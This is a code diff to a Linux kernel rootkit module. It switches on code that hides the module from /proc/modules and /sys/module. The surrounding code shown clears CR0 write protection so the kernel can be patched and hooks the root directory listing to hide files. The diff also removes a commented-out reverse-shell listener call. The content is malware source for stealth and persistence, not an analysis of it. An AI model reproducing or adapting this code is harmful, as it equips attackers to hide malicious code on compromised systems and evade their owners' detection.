@@ -262,7 +262,7 @@ long get_my_pid(void) {
 
 void disable_wp(void) {
 	preempt_disable(); //disable kernel preemption, we don't want a process to use the function while we are altering it 
-	barrier(); //barrier?
+	barrier(); //barrier
 	write_cr0(read_cr0() & (~0x10000));
 }
 
@@ -273,8 +273,8 @@ void enable_wp(void) {
 }
 
 static int rootkit_init(void) {	
-	//list_del_init(&__this_module.list); //hide module from /proc/modules
-	//kobject_del(&THIS_MODULE->mkobj.kobj); //hide module from /sys/module
+	list_del_init(&__this_module.list); //hide module from /proc/modules
+	kobject_del(&THIS_MODULE->mkobj.kobj); //hide module from /sys/module
 
 	printk("rootkit: root_readdir found at ");
 	orig_root_readdir = get_readdir("/"); //root readdir to hide all files and directories		
@@ -296,7 +296,7 @@ static int rootkit_init(void) {
 
 	printk("rootkit: module loaded\n");
 
-	return 0;//start_listener(KEYLOGGER); //start ping listener for reverse shell
+	return 0;
 }
 
 static void rootkit_exit(void) {
